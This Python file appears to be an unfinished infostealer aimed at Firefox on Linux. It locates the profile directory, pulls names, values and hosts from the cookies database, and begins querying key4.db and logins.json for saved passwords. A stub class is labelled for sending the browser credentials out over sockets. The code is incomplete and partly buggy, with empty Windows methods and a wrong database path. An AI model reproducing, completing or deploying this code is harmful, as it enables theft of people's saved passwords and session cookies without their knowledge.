from abc import ABC, abstractmethod
import os, socket, platform, sqlite3, json;


# * Classes to detect Operating System
class OSInterface(ABC):
    @abstractmethod
    def DetectOperatingSystem(self):
        pass


class OSDetector(OSInterface):
    def DetectOperatingSystem(self):
        return platform.system();



# * Classes to search profile directories in different browsers
class ProfileDirectoryFinder(ABC):
    @abstractmethod
    def FindProfileDirectoryInLinux(self):
        pass

    @abstractmethod 
    def FindProfileDirectoryInWindows(self):
        pass


class FirefoxProfileFinder(ProfileDirectoryFinder):

    def FindProfileDirectoryInLinux(self):

        homeDirectory = os.path.expanduser("~");
        browserDirectory = os.path.join(homeDirectory, ".mozilla/firefox")


        if ".mozilla" not in os.listdir(homeDirectory):
            raise FileNotFoundError("Firefox not installed")


        for directory in os.listdir(browserDirectory):

            if(directory.endswith(".default-esr")):
                browserDirectory = os.path.join(browserDirectory, directory);
                return browserDirectory

            elif(directory.endswith(".default")):
                browserDirectory = os.path.join(browserDirectory, directory); 
                return browserDirectory
            

        raise FileNotFoundError("Firefox profile directory not found")
         


    def FindProfileDirectoryInWindows(self):
        pass

    
    
    

# * Classes to obtain Browser Cookies
class BrowserCookiesGetter(ABC):

    @abstractmethod
    def GetCookiesInLinux(self):
        pass

    @abstractmethod
    def GetCookiesInWindows(self):
        pass

    


class FirefoxCookiesGetter(BrowserCookiesGetter):

    def __init__(self, profileFinder: ProfileDirectoryFinder): 
        self.profileFinder = profileFinder;


    def GetCookiesInLinux(self):

        try: 

            browserDirectory = ProfileDirectoryFinder.FindProfileDirectoryInLinux();
            cookiesDbPath = os.path.join(browserDirectory, "cookies.sqlite");


            if not os.path.exists(cookiesDbPath):
                raise FileNotFoundError("Cookies database not found!");


            connection = sqlite3.connect(browserDirectory)
            cursor = connection.cursor()
            cursor.execute('SELECT name, value, host FROM moz_cookies')
            cookies = cursor.fetchall()
            connection.close()

            return cookies;

        except Exception as e:
            print(e)
            return False;
            


    def GetCookiesInWindows(self, username):
        pass




# * Classes to get saved passwords in browsers 
class BrowserPasswordsGetter(ABC):

    @abstractmethod
    def GetPasswordInLinux(self):
        pass

    @abstractmethod
    def GetPasswordsInWindows(self):
        pass



class FirefoxPasswordsGetter(BrowserPasswordsGetter):

    def __init__(self, profileFinder: ProfileDirectoryFinder):
        self.profileFinder = profileFinder;


    def GetPasswordInLinux(self):


        try:

            browserDirectory = self.profileFinder.FindProfileDirectoryInLinux();
            keyDbPath = os.path.join(browserDirectory, "key4.db");             
            loginFilePath = os.path.join(browserDirectory, "logins.json")



            if(not os.path.exists(keyDbPath) or not os.path.exists(loginFilePath)): 
                raise FileNotFoundError("Key4.db or logins.json not exists!");


            try:
        
                results = self.__ExecuteSQLQuery(keyDbPath, "SELECT item1, item2 FROM metadata WHERE id = 'password';");

                



            except Exception as e:
                print(e)

           
            
            
            
            
            
            









        except Exception as e:

            print(e)
            pass
        




    def GetPasswordsInWindows(self):
        
        return "Pipe Porrero"

        
    def __ExecuteSQLQuery(self, dbPath, sqlQuery):


        with sqlite3.connect(dbPath) as db:

            cursor = db.cursor()
            cursor.execute(sqlQuery);
            results = cursor.fetchall()

        return results;



        
        






        











































# * Classes to send Browser credentials with Sockets
class SocketSender(ABC):

    @abstractmethod
    def Send(ip, port):
        pass

     


    
class BrowserDataSender(SocketSender):

    def __init__(self):
        pass

    def Send(self):
        pass








def Main():


    finder = FirefoxProfileFinder();


    xd = FirefoxPasswordsGetter(finder);

    xd.GetPasswordInLinux()




if __name__ == "__main__":
    Main()
